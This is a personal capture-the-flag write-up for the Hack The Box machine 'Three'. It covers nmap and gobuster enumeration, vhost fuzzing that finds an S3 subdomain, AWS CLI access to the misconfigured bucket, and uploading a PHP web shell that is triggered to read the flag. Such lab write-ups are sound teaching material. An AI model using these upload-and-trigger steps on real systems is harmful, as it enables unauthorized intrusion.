>[!tldr] Three is a very easy Linux machine featuring a website using a misconfigured #AWS-S3-bucket as its cloud-storage device. The machine explores web application enumeration and subdomain fuzzing to detect the hidden domain corresponding to the S3 bucket. Then it showcases using the AWS command line interface to access the vulnerable S3 bucket as well as how to exploit it by uploading and triggering a reverse shell.

# Adventure Mode
---

1. Starting with a nmap scan
	1. `nmap 10.129.227.248 -p- -sT --stats-every=5s`
	-> Ports: `22` and `80`
	2. `nmap 10.129.227.248 -p22,80 -sCV`
```Shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
2. I then pulled up `ZAP` and checked out the website, i did a automated scan to find more pages and any vulnerabilities. There were a few, but i decided to enumerate
3. Next i ran `gobuster`
	1. `gobuster dir -k -u http://10.129.227.248/ -w Tools/SecLists-2026.1/Discovery/Web-Content/raft-small-directories.txt -x txt,php,html -t 40`
```shell
===============================================================
images               (Status: 301) [Size: 317] [--> http://10.129.227.248/images/]
index.php            (Status: 200) [Size: 11952]
server-status        (Status: 403) [Size: 279]
Progress: 80460 / 80460 (100.00%)
===============================================================
```
- The first out put was underwhelming so i ran it again with a larger wordlist with the same outuput... I then decided to try with the subdomain of `thetoppers.htb` 
```shell
===============================================================
index.php            (Status: 200) [Size: 11952]
images               (Status: 301) [Size: 317] [--> http://thetoppers.htb/images/]
server-status        (Status: 403) [Size: 279]
index.php            (Status: 200) [Size: 11952]
Progress: 249124 / 249124 (100.00%)
===============================================================
```
- Its really no better... I decided to read the "*about*" since im basically stuck. 
4. I already tried enumerating the website so i will now try to enumerate the subdomains. 
	`gobuster dns --do thetoppers.htb -w Tools/SecLists-2026.1/Discovery/DNS/subdomains-top1million-110000.txt  -t 40`
- This is wrong since HTB doesnt run a DNS server, instead i have to search with vhosts.
	`gobuster vhost -u http://10.129.227.248 --domain thetoppers.htb -w Tools/SecLists-2026.1/Discovery/DNS/subdomains-top1million-110000.txt -t 40`
- However this got a lot of bad connections with the content length of `306`. So i added `--xl 306` to filter out this content. But this time it returned nothing 
```shell
gobuster vhost -u http://10.129.4.194 --domain thetoppers.htb --append-domain \
           -w Tools/SecLists-2026.1/Discovery/DNS/subdomains-top1million-5000.txt -t 80 --xl 306
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://10.129.4.194
[+] Method:                    GET
[+] Threads:                   80
[+] Wordlist:                  Tools/SecLists-2026.1/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Length:            306
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
s3.thetoppers.htb Status: 404 [Size: 21]
Progress: 5000 / 5000 (100.00%)
===============================================================
Finished
===============================================================
```
- We should check out the `s3` subdomain which is a amazon web service (aws) which holds data.
5. Lets use the `aws` tool to get info from the s3 bucket
```shell
❯ aws configure
AWS Access Key ID [None]: password
AWS Secret Access Key [None]: password
Default region name [None]: us-east-1
Default output format [None]:
❯ aws --endpoint-url=http://s3.thetoppers.htb s3 ls /
2026-06-09 14:04:21 thetoppers.htb
```
- Cool we got a output but its nothing useful, after learning more there's a `cp` command to download 
	`aws --endpoint-url=http://s3.thetoppers.htb s3 cp /var/www/flag.txt` -> Nothing
- Next we can upload to the bucket so we can send a reverse shell
	`aws --endpoint-url=http://s3.thetoppers.htb/ s3 cp Tools/p0wny.php s3://thetoppers.htb/rev.php`
- Now in a web page we call `http://thetoppers.htb/rev.php` and get our reverse shell, from here we use the terminal to get to `www/var/` and cat `flag.txt`
	- Flag -> `[REDACTED_FLAG]`